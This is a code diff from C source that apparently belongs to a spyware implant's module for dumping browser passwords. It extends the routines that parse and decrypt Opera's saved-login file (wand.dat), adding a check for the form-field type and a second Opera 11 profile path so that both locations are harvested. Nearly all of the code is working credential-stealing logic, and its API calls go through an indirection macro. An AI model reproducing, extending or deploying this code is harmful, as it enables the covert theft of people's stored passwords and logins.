@@ -34,6 +34,7 @@ WCHAR *GetOPProfilePath();
 
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
 
+#define FORM_FIELDS 0x0c020000
 int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 {
 	WCHAR wandPath[MAX_PATH];
@@ -77,6 +78,8 @@ int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 
 	while(wandOffset < fileSize)
 	{
+		DWORD *field_type;
+
 		// find key length field at start of block
 		unsigned char *wandKey = (unsigned char *)
 			memchr(wandData + wandOffset, DES_KEY_SZ, fileSize - wandOffset);
@@ -84,7 +87,11 @@ int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 		if (wandKey == NULL)
 			break;
 
-		wandOffset = ++wandKey - wandData;
+		// Vede quando cominciano i field
+		field_type = (DWORD *)(++wandKey);
+		field_type-=3;
+
+		wandOffset = wandKey - wandData;
 
 		// create pointers to length fields
 		unsigned char *blockLengthPtr = wandKey - 8;
@@ -175,7 +182,7 @@ int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 				field_num++;
 				swprintf_s(opentry.user_value, 255, L"%s", cryptoData);
 			}
-			if (field_num == 1) {
+			if (field_num == 1 && (*field_type) == FORM_FIELDS) {
 				// salta i dispari che sono i nome dei field
 				field_num++;
 			}
@@ -193,7 +200,6 @@ int DumpOP(WCHAR *profilePath, WCHAR *signonFile)
 	return 1;
 }
 
-
 WCHAR *GetOPProfilePath()
 {
 	WCHAR appPath[MAX_PATH];
@@ -206,14 +212,26 @@ WCHAR *GetOPProfilePath()
 	return FullPath;
 }
 
+WCHAR *GetOPProfilePath11()
+{
+	WCHAR appPath[MAX_PATH];
+	static WCHAR FullPath[MAX_PATH];
+ 
+	FNC(GetEnvironmentVariableW)(L"APPDATA", appPath, MAX_PATH);
+
+	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Opera\\Opera", appPath);
+
+	return FullPath;
+}
+
 
 int DumpOpera(void)
 {
 	WCHAR *ProfilePath = NULL; 	//Profile path
 
-	ProfilePath = GetOPProfilePath();
-	
-	// get the password for the three versions
+	ProfilePath = GetOPProfilePath();	
+	DumpOP(ProfilePath, L"wand.dat");   
+	ProfilePath = GetOPProfilePath11();	
 	DumpOP(ProfilePath, L"wand.dat");   
 
 	return 0;
